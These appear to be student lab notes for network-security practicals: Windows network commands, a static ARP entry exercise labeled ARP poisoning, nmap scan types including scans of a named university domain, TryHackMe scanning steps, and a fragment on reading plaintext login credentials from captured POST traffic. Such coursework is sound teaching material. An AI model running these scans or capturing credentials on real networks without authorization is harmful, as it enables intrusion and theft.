PRACTICAL  3
Part 1 :Aim : Run and analyze the output of the following commands in Windows - ipconfig, ping, netstat, tracert, nslookup

Steps :
Open the Command Prompt on your computer and run the following
commands
1. ipconfig
2. ping
3. tracert <ip address>
4. netstat
5. nslookup

Part 2 :Aim : Perform ARP Poisoning in Windows
Steps :
1. Open the Command Prompt on your laptop and run it as administrator
2. First, run the command arp -a
3. Next, we have to add static entries. So enter the command ipconfig.
4. Then enter the command getmac to get the MAC address
5. Then enter the command arp -s <ipv4 address> <mac address>
6. Enter the arp -a command again and search for the IPv4 address corresponding to the MAC address and see if the type has become static. If it
     has, then ARP Poisoning is done.
7. Finally, delete the address using the command arp -d <ip address>
8. Use arp -a to check if the address has been deleted.

Part 3 : Aim : Use Cain and Abel to perform ARP Poisoning

PRACTICAL  4
Aim : Use NMAP scanner to perform port scanning of various forms - ACK, SYN, FIN, NULL, XMAS

Commands :
i. SYN scan
     ● nmap -sS <ip address of another device>
     ● nmap -sS <gatewaynumber>
     ● nmap -sS 127.0.0.1
ii. FIN scan
     ● nmap -sF 172.23.0.128
     ● nmap -sF somaiya.edu
     ● nmap -sF -T4 somaiya.edu
iii. NULL scan
     ● nmap –sN <target address>
iv. XMAS scan
     ● nmap -sX <target address>
v. ACK Scan
     ● nmap -sA <ip address of another device>
Other scans :
     ● nmap -T4 -A -v <ip address of another device>
     ● nmap -p 21,80,443 <website name>
-----------------------------------------------------------------------------
To perform a scan with Nmap to check the ACK, SYN, etc. and get the number of nodes, you can use the following command:
php
Copy code
nmap -sS -sA -sn <target>
Here's what each option does:
-sS: Performs a SYN scan (checks if the port is open by sending a SYN packet).
-sA: Performs an ACK scan (checks if the port is filtered by sending an ACK packet).
-sn: Disables port scanning and only performs host discovery.
Replace <target> with the target IP address or hostname you want to scan.
-----------------------------------------------------------------------------
To obtain the number of nodes discovered during the scan, you can add the -v option for verbose output. Here's the modified command:
nmap -sS -sA -sn -v 192.168.1.0/24
With the -v option, Nmap will display verbose output, including information about the number of nodes discovered during the scan. Adjust the IP range as needed for your network.
-----------------------------------------------------------------------------------
the steps to perform a basic Nmap scan on TryHackMe:
1. *Access TryHackMe:* Log in and select the room or machine you want to scan.
2. *Identify Target:* Find the target's IP address or hostname.
3. *Open Terminal:* Open a terminal or command prompt.
4. *Run Nmap Scan:* Execute nmap -Pn -T4 <target> replacing <target> with the target's IP or hostname.
5. *Review Results:* Analyze the scan results for open ports and services.
6. *Further Analysis:* Optionally, perform more detailed scans for service version detection, OS detection, or vulnerabilities.
7. *Document Findings:* Keep track of any vulnerabilities or interesting findings.
8. *Take Action:* Depending on your goals, exploit vulnerabilities, patch systems, or report findings.
Always ensure you have proper authorization before scanning any network or system.

5. Then search for entries with the HTTP verb POST in the Info column and click on it.
6. Then below the log entries, there will be a panel with the summary of the captured data.
     Locate the one that says “application/x-www-form-urlencoded”
     Click on it and it shows the plaintext of the email and password entered in techpanda
